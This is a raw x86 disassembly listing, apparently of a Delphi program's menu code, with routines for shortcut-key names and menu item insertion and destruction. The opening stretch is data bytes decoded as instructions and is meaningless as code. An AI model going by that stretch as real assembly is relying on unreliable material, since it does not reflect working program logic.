mov cl 0x44
add [ eax ] bh
mov cl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] cl
mov cl 0x44
add [ eax ] bl
mov cl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ eax + edi * 4 + 0x44 ] bh
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ esp + ebp * 4 + 0x44 ] cl
add al ch
lodsb [ esi ]
inc esp
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esp
add [ eax ] bh
add [ eax ] al
mov al [ 0xffffffffb400445f ]
mov al 0x41
outsd
inc edx
outsd
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
dec eax
outsd
je r-xdata
add al dl
mov ah 0xb0
inc ecx
sbb [ esp + eax * 2 ] ah
pop es
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
inc eax
outsd
insd
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jo r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsd
pushad
arpl [ eax + eax + 0x6 ] ax
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
jmp [ eax + esi * 4 + 0x10044 ]
xor al 0x42
inc esp
add [ eax ] cl
add bh bh
lodsb [ esi ]
lodsb [ esi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add ah al
mov eax 0xb8cc0044
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc esp
imul ecx [ ebp + 0x6f ] 0x14f86564
inc ecx
adc al 0x41
add [ eax ] dh
add [ eax ] al
call [ eax - 0x77ffbb50 ]
test eax 0x44
adc al 0x41
clc
jl r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
outsb
add eax 0x756e654d
jae r-xdata
bound eax [ eax + eax + 0x3 ]
andps xmm1 [ ebp + 0x65 ]
outsb
jne r-xdata
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
bound eax [ eax + eax + 0x68 ]
add [ eax ] al
[ eax ]
inc ecx
add ah al
je r-xdata
inc ebx
push 0x65676e61
adc eax 0x700041
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
arpl [ eax + eax + 0x69 ] ax
add [ eax ] al
[ ecx ]
add [ eax - 0x80000000 ] al
mov [ ecx + 0x44 ] ch
inc esp
inc ecx
add ah dl
mov al 0x41
add [ eax ] cl
mov eax 0xac340044
inc esp
add [ eax - 0x5c ] bh
inc esp
add [ esp + ebp * 4 + 0x44 ] ah
add [ eax + 0x680044b8 ] dh
mov ecx 0x540a0044
push eax
outsd
jo r-xdata
lodsd [ esi ]
arpl [ eax + eax + 0x54 ] ax
pushad
inc esp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
je r-xdata
insd
popad
inc edx
outsd
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
inc esp
je r-xdata
xor al 0x40
shr [ eax + 0x66 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x44 ] bh
add [ eax + eax ] dl
add [ eax ] al
call 0xffffffffc444a763
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
jo r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah dh
aas
inc ecx
add [ eax - 0x27ffbebf ] bl
inc ebx
inc ecx
add [ eax + 0x40 ] cl
inc ecx
add ah al
inc eax
inc ecx
add [ eax + 0xa0044b2 ] al
push esp
push eax
outsd
jo r-xdata
add al ch
sbb al [ ecx ]
les esi [ eax + eax * 2 ]
outsb
mov [ eax + 0x44 ] bl
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
jl r-xdata
add [ edx + 0x44 ] dh
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add al 0x0
test ebx ebx
je r-xdata
je r-xdata
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
dec eax
xor eax 0x35ac0042
inc edx
add [ ebp + esi + 0x35780042 ] cl
add [ eax ] cl
add [ eax ] al
add [ eax ] cl
xor al 0x42
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x35 ] cl
inc edx
add [ ebp + esi + 0x358c0042 ] ch
inc edx
add [ eax + 0x35 ] bh
imul esi [ ebx + 0x74 ] 0x4466d490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
inc sp
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc esp
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43b858
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_446720
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_436024
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43b858
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_446778
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_4467b0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404050
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4042c0
sub_446804
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_4469ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040e8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404238
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040e8
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040e8
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404238
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404238
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404050
mov eax esi
call sub_404050
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040e8
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407f48
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40435c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_4467b0
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404318
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040e8
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404318
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404318
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4469f4
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
sub_446a08
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404310
push eax
mov eax edi
call sub_404310
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404310
push eax
mov eax edi
call sub_404510
push eax
mov eax [ esi ]
call sub_404510
pop edx
pop ecx
call sub_407df4
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404310
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4045b0
sub_446a64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_446b3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_446a08
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_446a08
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_446a08
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_446a08
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b46
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_446804
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407da4
test eax eax
jne r-xdata
sub_446b7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44911c
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44912c
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_446bdc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44911c
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44911c
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44912c
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44912c
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_446b7c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_446b7c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44912c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44912c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_446d28
push ebx
mov ebx eax
mov eax ebx
call sub_4438d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_44bc38
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_446d60
push ebx
mov ebx eax
mov eax ebx
call sub_4438e4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446d90
push ebx
mov ebx eax
mov eax ebx
call sub_4438f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446dc0
push ebx
mov ebx eax
mov eax ebx
call sub_443920
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446df0
push ebx
mov ebx eax
mov eax ebx
call sub_443948
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_40445c
je r-xdata
mov al 0x1
pop ebx
retn
sub_446e24
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44390c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_446e60
push ebx
mov ebx eax
mov eax ebx
call sub_44395c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446e94
push ebx
mov ebx eax
mov eax ebx
call sub_443970
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446ec8
push ebx
mov ebx eax
mov eax ebx
call sub_443984
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446efc
push ebx
mov ebx eax
mov eax ebx
call sub_41b234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446f24
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_446f44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448f84
sub_446f64
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_448ff4
sub_446f84
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_449048
sub_446fa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_446fc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_4040a4
sub_446fe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449174
sub_447004
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449150
sub_447024
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_449164
sub_447044
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_447070
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a944
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_446b5c
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449a80
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4470ec
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44ba1c
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44911c
test eax eax
jg r-xdata
mov edx esi
call sub_4494b4
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44912c
call sub_403294
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403294
lea eax [ esi + 0x44 ]
call sub_40d19c
lea eax [ esi + 0x78 ]
call sub_40d19c
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_447508
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41469c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
call sub_403294
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4471a0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4473fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447402
lea eax [ ebp - 0x40 ]
call sub_404050
lea eax [ ebp - 0x8 ]
call sub_404050
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4040e8
mov eax ebx
call sub_44911c
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_4476b0
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40445c
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44911c
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_4496d8
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_446804
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043d0
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404510
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404510
push eax
mov eax ebx
call sub_4476b0
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_448cf4
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40445c
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
